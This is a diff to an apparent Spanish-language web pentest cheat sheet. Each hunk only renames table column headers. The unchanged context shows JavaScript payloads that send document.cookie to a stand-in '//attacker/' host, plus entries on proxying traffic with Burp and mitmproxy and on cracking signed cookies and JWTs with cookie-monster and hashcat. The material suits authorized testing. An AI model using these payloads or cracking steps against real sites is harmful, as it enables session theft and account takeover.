@@ -23,7 +23,7 @@ linked:
 
 ## Burp Session Handling Rules
 
-| **Función** | **Acción** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Settings → Sessions | Configure session handling rules | Built-in. |
 | Cookie jar | Burp manages cookies automatically | Standard. |
@@ -56,7 +56,7 @@ ___
 
 ## mitmproxy / Wireshark
 
-| **Tool** | **Comando / Setup** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | mitmproxy | `mitmproxy -p 8080` | Interactive HTTPS proxy. |
 | mitmweb | Web UI alternative | Easier UI. |
@@ -80,7 +80,7 @@ ___
 
 ## Custom JS Exfil Payloads
 
-| **Payload** | **Workflow** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | `fetch('//attacker/?c=' + document.cookie)` | Standard | Quick. |
 | `new Image().src='//attacker/?c='+document.cookie` | Image-based exfil | Common. |
@@ -118,7 +118,7 @@ ___
 
 ## cookie-monster / Cookieless
 
-| **Tool** | **Uso** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | cookie-monster (CLI) | https://github.com/iangcarroll/cookiemonster | Detect signed cookies + crack. |
 | Run | `cookiemonster -cookie 'session=...'` | Detection. |
@@ -157,7 +157,7 @@ ___
 
 ## Hashcat para Signed Cookies
 
-| **Mode** | **Cookie format** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | `-m 16500` | JWT HS256 | Standard JWT. |
 | `-m 19500` | Flask session | Specific. |
